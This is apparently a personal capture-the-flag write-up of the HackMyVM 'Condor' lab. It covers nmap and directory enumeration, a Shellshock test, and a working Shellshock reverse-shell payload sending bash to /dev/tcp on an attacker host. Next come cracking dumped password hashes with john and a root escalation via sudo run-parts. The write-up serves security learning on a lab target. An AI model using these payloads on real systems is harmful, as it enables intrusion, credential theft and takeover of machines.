---
layout: default
title : muzec - Condor - HackMyVm 
---



### Enumeration With Nmap

We always start with an nmap scan.....

```Nmap -sC -sV -p- -oA nmap <Target-IP> -vv```

```
# Nmap 7.91 scan initiated Mon Nov 15 09:37:32 2021 as: nmap -sC -sV -p- -oA nmap -vv 172.16.109.159
Nmap scan report for 172.16.109.159
Host is up, received syn-ack (0.00023s latency).
Scanned at 2021-11-15 09:37:33 WAT for 8s
Not shown: 65533 closed ports
Reason: 65533 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 39:41:db:3a:f0:8f:7d:4d:85:c5:aa:0b:5f:66:ba:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDByhYIyiS98RS0gG4B16TAWtpKa+0kovSWt+UIipQR3wA0FJjLh47zpmGoP7HaEP7/0YNIrnrXMCEmQgOvl8T1nafWTaZ47YwkShQRX10leXka2l4naoYK9vFJIUahkM/Gjx8HgLjJu7xLKId1jffPhXSLU60TnBgGW/e7rqcNFB5Mz5cl/mFIraX0/81DZ40Ue+5ttxAT+4u9hbYoYy1MEyoRNQ0N3g6UPK26IHazF0xkLlxHqP7L4iLfnl5GjF18sVGg6vPYcSi/aTTyAKY85PhhBgcrRkOE0tqFXrznT84UX5Kz6EBHdS9Xlar4/q/JQCQYdC3s38XXrs32WwAY4eG1YYvuep6l26KYSaymGRpx3Nk3WltkqQlKM2bHq8jCWI9bL8vEf5UMSbsk/QRTrPf+blfXIokCYz2m+QFmDddPKQ24JYj/wAQ6z7qgl/MNrfC1CKyAbnnRkSE/pto8b7iJgOd7CkB3M28730/bRYHwZbJJNnJG1I/0jxDpj9k=
|   256 66:89:b1:8e:8b:af:cf:7f:49:c5:7c:e6:4b:b7:d8:5b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC4vXcAX0FuhBEcZk2KA5njtMpDJSpWAsddCggiHljbJ3/IjV5dkVX1cnBkMv9uB5dTaV+Qe0qVJPGCermYxHbw=
|   256 a3:b3:f0:14:a4:4e:05:c0:d1:24:2f:a8:fe:a5:2c:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINY9x5z6Jg3VUD13RTFE507JApanRMhT9wbDvDSWQN92
80/tcp open  http    syn-ack Apache httpd 2.4.51 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 15 09:37:42 2021 -- 1 IP address (1 host up) scanned in 9.43 seconds
```

### PORTS 

```
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.51 ((Debian))
```

Interesting we have 2 open ports which is cool and easy i guess let start digging.

### Enumeration On Port 80 HTTP

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/condor]
└─$ dirb http://172.16.109.159/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Nov 15 09:44:26 2021
URL_BASE: http://172.16.109.159/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.109.159/ ----
+ http://172.16.109.159/cgi-bin/ (CODE:403|SIZE:279)                                                                                                                  
+ http://172.16.109.159/index.php (CODE:200|SIZE:183)                                                                                                                 
+ http://172.16.109.159/server-status (CODE:403|SIZE:279)                                                                                                             
                                                                                                                                                                      
-----------------
END_TIME: Mon Nov 15 09:44:28 2021
DOWNLOADED: 4612 - FOUND: 3
```

A quick dirb directories bursting but got `index.php and cgi-bin` default i guess navigating to confirm it on browser.

![image](https://user-images.githubusercontent.com/69868171/141776919-9157676a-f766-4867-89d9-e9376714a0aa.png)

Checking page source also i go nothing so i decided to burst more directories.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/condor]
└─$ gobuster dir -u http://172.16.109.159/cgi-bin -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,phtml,html,txt,old,jpg,cgi,sh
===============================================================
Gobuster v3.1.0                                                                    
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.109.159/cgi-bin
[+] Method:                  GET                                                   
[+] Threads:                 10                                                    
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404                                                   
[+] User Agent:              gobuster/3.1.0    
[+] Extensions:              html,txt,old,jpg,cgi,sh,php,phtml
[+] Timeout:                 10s                                                   
===============================================================
2021/11/15 09:49:43 Starting gobuster in directory enumeration mode
===============================================================
```

![image](https://user-images.githubusercontent.com/69868171/141777664-fbf5156d-ba4f-4cf8-a8f5-8b810a5ef91c.png)

/test.cgi             (Status: 200) [Size: 20]

![image](https://user-images.githubusercontent.com/69868171/141777927-b94e276e-6320-4e68-a3ff-e144b9369363.png)

/condor.sh            (Status: 200) [Size: 137]

Smooth now that is getting interesting we have 2 files with status 200 it possible we are dealing with shellshock or not so i decided to look up some CGI tricks.


```                                                                                                                                                                    
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/condor]
└─$ curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://172.16.109.159/cgi-bin/test.cgi 2>/dev/null| grep 'VULNERABLE'
```

But dead end got nothing hehehehehe we still have `condor.sh` to try let hit it.

![image](https://user-images.githubusercontent.com/69868171/141781376-5abd1c1c-8feb-41e5-8fb0-dca4c69481b1.png)

```
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/172.16.109.1/1337 0>&1' http://172.16.109.159/cgi-bin/condor.sh
```

Ncat listener ready running the payload and boom we got our shell now let spawn a TTY shell.

![image](https://user-images.githubusercontent.com/69868171/141781784-4e69b445-70e0-4ab1-8317-ce79f2d9a554.png)

Now we have a strong and stable shell let enumerate more to move our Privilege to another user.

![image](https://user-images.githubusercontent.com/69868171/141782353-2e9a3ef3-3237-4b67-9902-9e6864e0127c.png)

Nice now let cat it to see what we have.

![image](https://user-images.githubusercontent.com/69868171/141782518-a95d9bcb-bd6e-43ce-b884-fafc1a9e049a.png)

Some hashes cool let feed it to john the ripper to see if it crackable or a rabbit hole lol.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/condor]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 29 password hashes with 29 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Remaining 27 password hashes with 27 different salts
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

![image](https://user-images.githubusercontent.com/69868171/141783427-2b38db77-fe55-4ce5-9346-3083cbc520ce.png)

I was able to crack two hashes which is cool i guess now let try it for both users.

### Shell As Paulo

![image](https://user-images.githubusercontent.com/69868171/141783913-c70edf18-df22-4747-9da6-909ece9c4913.png)

Boom i was able to get access with `username:- paulo and password:- password123` 

### Privilege Escalation

Time to get root checking `sudo -l` and seems we can run a command to get root .

```
User paulo may run the following commands on condor:
    (ALL : ALL) NOPASSWD: /usr/bin/run-parts
```

Nice so i look up gtfobins.

![image](https://user-images.githubusercontent.com/69868171/141784428-1771b9a6-b259-4713-9b5c-549c0a7317a7.png)


If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo run-parts --new-session --regex '^sh$' /bin
```
![image](https://user-images.githubusercontent.com/69868171/141784745-1fd12638-f761-4281-9740-a24716bbe8e8.png)

We are root and done.

### Helpful Resources

```
https://book.hacktricks.xyz/pentesting/pentesting-web/cgi

https://gtfobins.github.io/gtfobins/run-parts/#sudo
```

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
